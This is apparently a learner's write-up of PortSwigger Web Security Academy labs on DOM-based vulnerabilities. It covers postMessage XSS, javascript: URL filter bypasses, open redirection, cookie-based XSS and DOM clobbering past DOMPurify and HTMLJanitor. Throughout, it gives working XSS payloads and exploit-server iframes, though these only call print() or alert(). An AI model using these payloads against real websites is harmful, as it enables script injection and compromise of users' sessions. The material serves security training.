- [What is DOM-based vulnerabilites?](#what-is-dom-based-vulnerabilites)
- [DOM XSS using web messages](#dom-xss-using-web-messages)
- [DOM XSS using web messages and a JavaScript URL](#dom-xss-using-web-messages-and-a-javascript-url)
- [DOM XSS using web messages and `JSON.parse`](#dom-xss-using-web-messages-and-jsonparse)
- [DOM-based open redirection](#dom-based-open-redirection)
- [DOM-based cookie manipulation](#dom-based-cookie-manipulation)
- [Exploiting DOM clobbering to enable XSS](#exploiting-dom-clobbering-to-enable-xss)
- [Clobbering DOM attributes to bypass HTML filters](#clobbering-dom-attributes-to-bypass-html-filters)

---

# What is DOM-based vulnerabilites?

Is when an application use JavaScript to manipulate the DOM in a unsafe manner. Usually we can inject code or redirect users to mailicous sites.

# DOM XSS using web messages

In the source code of this lab we found this script:

```js
window.addEventListener('message', function(e) { document.getElementById('ads').innerHTML = e.data; })
```

- `window.addEventListener('message')` -> Listen messages "postMessage" from iframes and open windows.
- `e.data` -> Contain the content of the sending message.
- `document.getElementById('ads').innerHTML = e.data;` -> Locate an element with the id 'ads' and insert the data of the postMessage. The dangerous sink is **innerHTML**.

postMessage is the "secure way" to how a iframe or other windows communicate to the parent page.

In the console you can try:

```js
postMessage("<script>print()</script>")
```

But is undefined and nothing work, what if you try with a image:

```js
postMessage("<img src=x onerror=print()>")
```

Ouh, we have to reproduce this but the user it's not goint to put this in the console, we have to go to exploit server:

```html
<iframe src="https://0a9500ae03c62b068039580c00730066.web-security-academy.net/" style="width:100%;height:100%;border:none" onload="this.contentWindow.postMessage('Testing', '*')"></iframe>
```

If you read this [page](https://developer.mozilla.org/es/docs/Web/API/Window/postMessage), you see that you can use `*` that means that the message can be send to a receiver with any origin.

The next step is use the print function to complete the lab.

```html
<iframe src="https://0a9500ae03c62b068039580c00730066.web-security-academy.net/" style="width:100%;height:100%;border:none" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')"></iframe>
```

# DOM XSS using web messages and a JavaScript URL

In this lab we found the following script:

```js
window.addEventListener('message', function(e) { var url = e.data; if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) { location.href = url; } }, false);
```

- `url = e.data` -> save the data in url variable.
- `if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1)` -> Returns the positions of the first occurence of a value in a string. Returns -1 if the value is not found.
- `location.href` -> Set the URL of the current page.

We can play with the console:

```js
"http://probando.com".indexOf('http:')
"adahttp://probando.comaaasd".indexOf('http:')
"javascript:alert(0)//http://probando.comaaasd".indexOf('http:')
postMessage("javascript:alert(0)//http://probando.com")
```

We try to simulate the script, then indexOf check that the value is found(greater than -1), if you add more characters at the beginning or at the end the value is greater than -1 and you're bypassing this filter.

If you check with postMessage you see that works, the next step is going to exploit server:

```html
<iframe src="https://0a4d001c04d5b1aa806b18ed00ed005b.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http://test.com', '*')" style="width:100%;height:100%;border=none;"></iframe>
```

# DOM XSS using web messages and `JSON.parse`

This is the script of this lab:

```js
window.addEventListener('message', function(e) {
	var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
	document.body.appendChild(iframe);
	try {
		d = JSON.parse(e.data);
	} catch(e) {
		return;
	}
	switch(d.type) {
		case "page-load":
			ACMEplayer.element.scrollIntoView();
			break;
		case "load-channel":
			ACMEplayer.element.src = d.url;
			break;
		case "player-height-changed":
			ACMEplayer.element.style.width = d.width + "px";
			ACMEplayer.element.style.height = d.height + "px";
			break;
	}
}, false);
```

In this case we continues using 'postMessage', but in this case the javascript code is creating a iframe with ACMEplayer is a custom or third-party video/audio/media player library embedded in the webpage.

- `d = JSON.parse(e.data);` -> d is the parsed data obtained from postMessage(). In case that exist some error the catch to handle exceptions and with return exit of the actual function, in this case from window.addEventListener...
- `d.type` -> in the variable 'd'(parsed data) is searching a type: 'page-load', 'load-channel', 'player-height-changed'
- `ACMEplayer.element.src = d.url` -> This is interesting, this cause that the iframe redirect to that URL.

In the console you can try:

```js
postMessage("{\"type\":\"load-channel\", \"url\": \"https://google.es\"}");
```

If you got to the bottom of the page and run this javscript code you see that a new iframe is loaded, but see something new, that the browser can open the webpage, in this case google. If you open the console you obtain an error:

- `The loading of “[https://www.google.com/](https://www.google.com/ "https://www.google.com/")” in a frame is denied by “X-Frame-Options“ directive set to “sameorigin“.`

This error means that google have the header X-Frame-Options and prevent the page from beign embedded inside an iframe on a different domain.

If you try to inject javascript code to test if it is interpreted.

```js
postMessage("{\"type\":\"load-channel\", \"url\": \"javascript:alert()\"}");
```

Ouh, nice, this works, now we can go to exploit server:

```html
<iframe src="https://0af400c30461554c8084c292004900b0.web-security-academy.net/" style="width:100%;height:100%;border:none;" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\": \"javascript:print()\"}", "*")'></iframe>
```

Important to close well all the quotes and use the asterisk to allow all origins.

# DOM-based open redirection

Open redirection allow an attacker to modify a redirection in the victim server, e.g:

- `https://example.com/?url=https://attacker.com`. And the victim website redirect to the attacker page.
- `https://example.com/registration/?redirectUrl=https://attacker.com` -> Is very common to see in the login or register pages.

If we see the source code we don't find nothing, we can go to some post and at the end of the code we found something:

```html
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
```

href attribute is not using, in this case only onclick that use a **regex** to check if the url parameter have https and then use exec to execute the regex, if find a match return a result array, otherwise it returns null, remember that location is the actually URL, the returnUrl variable expect something like: `url=https://example.com`.

In the console if you run:
- `/url=(https?:\/\/.+)/.exec(location)`

You obtain null, but if you put this url:

`https://0aaa00b7032a646281ce112e002d0095.web-security-academy.net/post?postId=5&url=https://hacked.com`

and the run again you obtain this:

`Array [ "url=https://hacked.com", "[https://hacked.com](https://hacked.com "https://hacked.com")" ]`

Then use location.href to redirect with a conditional with different case(this is like an if). If the first position of the array have content redirect to that data, content but if is doesn't have content send to the main/root page.

And why don't work if we redirect to "hacked.com" this is because you have to **click** in "Back to blog".

The idea of this lab is redirect to the exploit server, to solve this we have to indicate the url of our exploit server:

```html
https://0aaa00b7032a646281ce112e002d0095.web-security-academy.net/post?postId=5&url=https://exploit-0ac6001d0341643981b3109401da00ac.exploit-server.net/
```

# DOM-based cookie manipulation

If we explore the page and view a product and go back we see that next to home appear "Last viewed product". if we inspect the source code we only see a link, if we intercept the request with Burpsuite we see this cookie:

```
lastViewedProduct=https://0a55007704a22642802ada7300b2001c.web-security-academy.net/product?productId=2
```

In the source code we see that the url is in simple quotes, we can try to escape adding another to see if is sanitized. 

```
https://0a55007704a22642802ada7300b2001c.web-security-academy.net/product?productId=2&'test
```

I add the ampersand beacuse the webpage give me an error "product not found", but with the ampersand avoid this problem and it seems that it does not sanitze.

Now we can try to do a HTML injection:

```
https://0a55007704a22642802ada7300b2001c.web-security-academy.net/product?productId=2&'><h1>test</h1>
```

But we don't see nothing, why?, because the content is saved in the cookie when go to Home.

HTML injection works, if we try to execute JS code:

```
https://0a55007704a22642802ada7300b2001c.web-security-academy.net/product?productId=2&'><script>alert(0)</script>
```

Nice!, we found a XSS. Next step, exploit server.

In this case we have to redirect one time inside the page, you have to take care because you can triggered an XSS if you use the same product, this is because the cookie because the cookie has been stored you can delete using another product and go home.

```html
<iframe src="https://0a55007704a22642802ada7300b2001c.web-security-academy.net/product?productId=5&'><script>print()</script>" onload="if(!window.x)this.src='https://google.es';window.x=1;">
</iframe>
```

In this case with `onload` we're redirecting to google, but we add a conditional for avoid a infinite loop. If window.x doesn't have nothing do the redirect, then set the window.x to some value.

```html
<iframe src="https://0a55007704a22642802ada7300b2001c.web-security-academy.net/product?productId=5&'><script>print()</script>" onload="if(!window.x)this.src='https://0a55007704a22642802ada7300b2001c.web-security-academy.net';window.x=1;">
</iframe>
```

# Exploiting DOM clobbering to enable XSS

> [!IMPORTANT]
> To solve this lab you have to use Chrome.

DOM clobbering is a type of injection that allow an attacker to insert **bening non-script HTML**. The attacker create some html code and then use the js code to execute malicious javascript code.

In the comment section we see that html injection works, but what happens if we try to inject javascript, for example an image with onerror. Yes, doesn't work, if we open the inspector we don't see the onerror attribute, but if you open the source code of the page you see three `script src` but the importants are:

- `domPurify.js` -> is a DOM-only XSS sanitizer for HTML. This may be the reason why onerror attribute has been removed.
- `loadCommentsWithDomClobbering.js` -> JavaScript code that load the comments.

If we inspect the code we see this suspicous lines, why are suspicious? because is using **window.defaultAvatar** and then injecting a property(avatar) in to the DOM.

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```

Would it be possible to change the value of avatar?
Yes.

The line that is building is this:

```js
<img class="avatar" src="">
```

If the avatar doesn't exist we see that the default image i'ts not escaping. We can try to some code like:

```js
<img class="avatar" src"0" onerror=alert(0)>// '">
```

If you open the console, create a variable with a value and get this value with window.variable you obtain the value right?

But if you try to obtain the id what is the value? The value is the html element.

Here we are going to play with clobbering, now you can try with name attribute, but doesn't work. You can use a python server with this simple index:

```
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar>
```

Now if you open the console and obtain the value with `window.defaultAvatar` you obtain a **HTMLCollection**(group of HTML elements in an array-like manner).

What happens if you try `window.defaultAvatar` in **Firefox** browser? You're going to **obtain only the first element**.

But if you indicate a name you can obtain the HTML value by his name:

```js
window.defaultAvatar.avatar;
```

return:

```
<a id=defaultAvatar name=avatar>
```

JavaScript see that the element is not a string and try to convert with **toString()**.

```js
window.defaultAvatar.avatar.toString();
```

But what happens if indicate a href with a value:

```html
<a id="defaultAvatar" name="avatar" href="https://google.es"></a>
```

In the console:

```js
window.defaultAvatar.avatar.toString()
```

return:

```
'https://google.com/'
```

Now we can try to **inject onerror attribute**(remember that is inserted in a `<img>`), in this case we use a html entity to cause an error.

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href="0&quot;onerror=alert(0)>//">
```

The idea now is to open a new post and put this code in the comment section.
This doesn't work but have a explanation.

Don't show nothing because you are injecting in the second vulnerable line of js, when the image is created, if you create a new comment you will see something different in the image, this is because you change the value of the avatar not like the first time because the default image had already been set.

`let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}` -> Use window.defaultAvatar(but if not exist use the default image.)

If we use the inspector we see this:

`<img class="avatar" src="https://0ac0005204587f628092268a006b0018.web-security-academy.net/0%22onerror=alert(0)%3E//">`

The double quotes (") are url-encode(%22).

We have to find a way to inject the double quotes without url-encode. 
DOMPurify can use the **cid protocol** which **does not URL-encode double-quotes**.

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(0)>//">
```

- It causes an error in the image syntax.
- This protocol don't url-encode the double quote(")

If you try in another post you see that this time works.

# Clobbering DOM attributes to bypass HTML filters

First of all, we check if the comment section is vulnerable to HTML injection, try some `<h1>, <h3>` doesn't work, if we try to use `<img>` don't appear nothing, something is happens, if we inspect the `htmlJanitor.js` we see in HTMLJanitor function is waiting a config parameter, in `loadCommentsWithHtmlJanitor.js` define a variable called janitor with a HTMLJanitor object that indicate the whitelisted elements:

- input: name, type, value
- form: id

What happens if we try this tags.

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

Why in the input id I put attributes?. Because in the `htmlJanitor.js` there is a function that remove the attribute and for this iterate for the attributes that exist in window.myform.attributes(list of attributes). If we create a form with an id called attributes we're **clobbering the list of attribute with the input element**.

You can check all this if you create a HTTP server and use the console to see the different values of `window.myform.attributes` without an input with id=attributes.

The javascript library now is checking only the input element and not the list of attributes, this is the reason that we can inject or load blacklisted attributes.

How we can check if this works? We have to point to the form element that have the `onfocus=print()`.

Code of the exploit server:
```html
<iframe src="https://0a1b003c0494166e81ff571600f800ca.web-security-academy.net/post?postId=3"onload="setTimeout(()=>this.src=this.src+'#x',500)"style=width:100vw;height:100vh;border:none;>
```

The unique thing that you have to know is that is possible that a **race condition** may occur. To solve this, you have to add a little of delay because the malicious server **receive the raw HTML** code and **have to start to build the DOM** and it could take a little of time.

